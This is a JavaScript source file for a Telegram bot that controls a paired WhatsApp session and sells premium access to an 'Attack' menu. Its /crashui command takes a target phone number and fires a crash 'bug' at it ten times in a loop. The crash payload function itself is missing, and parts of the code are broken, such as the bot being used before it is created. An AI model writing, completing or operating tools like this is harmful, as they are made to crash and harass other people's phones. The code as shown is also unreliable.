const { Telegraf } = require("telegraf");
const fs = require('fs');
const path = require('path');
const jid = "6285894428991@s.whatsapp.net";

const isModerator = (userId) => {
return false;};
const developerId = "ID_DEVELOPER"; 
const developerIds = ["ID_DEVELOPER"];
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const TOKEN_URL = 'TOKEN_DB';
const photoUrl = "PHOTO_ID";
let secureMode = false;

function activateSecureMode() {
  secureMode = true;
}

bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(TOKEN_URL);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        console.error('❌ Error saat cek token:', e.message);
        return false;
    }
}

(async () => {
    const isTokenValid = await isAuthorizedToken(tokenBot);
    if (!isTokenValid) {
        console.log('❌ Your bot token is not authorized to use this');
        activateSecureMode();
        process.exit();
    }
})();

async function getGitHubData(path) {
    const octokit = await loadOctokit();
    try {
        const response = await octokit.repos.getContent({
            owner,
            repo,
            path,
        });
        const content = Buffer.from(response.data.content, 'base64').toString();
        return { data: JSON.parse(content), sha: response.data.sha };
    } catch (error) {
        return { data: null, sha: null };
    }
}

async function updateGitHubData(path, content, sha) {
    const octokit = await loadOctokit();
    try {
        await octokit.repos.createOrUpdateFileContents({
            owner,
            repo,
            path,
            message: `Update`,
            content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
            sha,
        });
    } catch (error) {
    }
}

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './premium.json';

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const startSesi = async () => {
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: '\u200B',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });
    
    if (usePairingCode && !sock.authState.creds.registered) {
        console.clear();
        let phoneNumber = await question(chalk.bold.magenta(`Silahkan input nomor sender`));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await sock.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.clear();
        console.log(chalk.bold.magenta(`kode: ${formattedCode}`))
    }

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.magenta(`terhubung...`));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 Example : /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 Durasi harus berupa angka (dalam hari)");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 Example : /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('resetsessi', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk pemilik");
    }

    const sessionsPath = path.join(__dirname, 'session');

    fs.stat(sessionsPath, (err, stats) => {
        if (err) {
            return ctx.reply("❌ Gagal melakukan reset, Karena tidak ada sender terhubung");
        }

        if (stats.isDirectory()) {
            fs.rm(sessionsPath, { recursive: true, force: true }, (err) => {
                if (err) {
                    return ctx.reply("❌ Gagal melakukan reset sender");
                }
                ctx.reply("✅ Berhasil melakukan reset sender");
            });
        } else {
            ctx.reply("❌ Gagal melakukan reset, Karena tidak ada sender terhubung");
        }
    });
});

bot.start(ctx => {
    const menuMessage = `( ⌭ ) – I'm <bot_name>, a Telegram bot built by <owner_name> using JavaScript technology. I was made to assist you, so use me wisely.
 ⬡═―—⊱ ⎧ <bot_name> ⎭ ⊰―—═⬡
  ▢ Creator : @<owner_name>
  ▢ Version : <versi_sc>
  ▢ Prefix : / ( Slash )
  ▢ Language : JavaScript
  ▢ User : ${ctx.from.first_name}
  ⬡═―—⊱ ⎧ <bot_status> ⎭ ⊰―—═⬡
  ▢ Sender Stats : ${isWhatsAppConnected ? 'Has Sender' : 'No Sender'}
  ▢ Premium Stats : ${isModerator(ctx.from.id) ? 'Has Prem' : 'No Prem'}`;


    const keyboard = [
        [
            {
                text: "! Attack",
                callback_data: "/attack"
            }
        ]
    ];

    ctx.replyWithPhoto(photoUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/attack', async (ctx) => {
    const menuMessage = `( ⌭ ) – I'm <bot_name>, a Telegram bot built by <owner_name> using JavaScript technology. I was made to assist you, so use me wisely.
 ⬡═―—⊱ ⎧ <bot_name> ⎭ ⊰―—═⬡
  ▢ Creator : @<owner_name>
  ▢ Version : <versi_sc>
  ▢ Prefix : / ( Slash )
  ▢ Language : JavaScript
  ▢ User : ${ctx.from.first_name}
 ⬡═―—⊱ ⎧ <bot_menu> ⎭ ⊰―—═⬡
  ▢ /crashui - Ui Crash Private`;

    const photoUrl = "https://files.catbox.moe/ln894k.png";

    const keyboard = [
        [
            {
                text: "! Controls",
                callback_data: "/controls"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: photoUrl,
            caption: menuMessage,
            parse_mode: "Markdown",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Invalid request: message is not modified: the new message content and the specified reply markup are exactly the same as the current message content and reply markup.") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const ownerMenu = `( ⌭ ) – I'm <bot_name>, a Telegram bot built by <owner_name> using JavaScript technology. I was made to assist you, so use me wisely.
 ⬡═―—⊱ ⎧ <bot_name> ⎭ ⊰―—═⬡
  ▢ Creator : @<owner_name>
  ▢ Version : <versi_sc>
  ▢ Prefix : / ( Slash )
  ▢ Language : JavaScript
  ▢ User : ${ctx.from.first_name}
 ⬡═―—⊱ ⎧ <bot_menu> ⎭ ⊰―—═⬡
  ▢ /resetsessi - Del Sender Number
  ▢ /addprem - Add Premium User
  ▢ /delprem - Del Premium User`;

    const keyboard = [
        [
            {
                text: "! Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(ownerMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Invalid request: message is not modified: the new message content and the specified reply markup are exactly the same as the current message content and reply markup.") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command("crashui", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example : /crashui 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, photoUrl, {
    caption: ` ▢  Target: ${q}
 ▢  Type: Ui Crash Andro
 ▢  Status: Sending Bug`,
    parse_mode: "Markdown"
  });
  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await functionbug(sock, target);
    await delay(1000)
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.telegram.sendPhoto(ctx.chat.id, photoUrl, {
    caption: ` ▢  Target: ${q}
 ▢  Type: Ui Crash Andro
 ▢  Status: Success Bug`,
    parse_mode: "Markdown"
  });
});